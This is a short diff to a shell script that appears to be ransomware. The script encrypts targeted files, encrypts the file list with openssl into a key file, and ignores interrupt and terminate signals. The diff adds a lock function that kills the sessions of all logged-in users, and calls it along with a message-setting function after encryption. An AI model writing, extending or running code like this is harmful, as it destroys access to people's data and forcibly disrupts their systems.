@@ -153,12 +153,13 @@ setmsg() {
 }
 
 lock() {
-    :
+    who -u | awk '{print $6}' | xargs kill -9 
 }
 
 
 main() {
     check_msg
+    check_req
     trap '' INT
     trap '' TERM
     #SOFT="YES"
@@ -168,6 +169,8 @@ main() {
     enc_loop "$targets"
     echo >> $PRIVATEKEY
     printf "$LIST" | openssl aes-256-cbc -k "$KEY" | openssl base64 >> $PRIVATEKEY
+    setmsg
+    lock
     EXIT
 }
 main
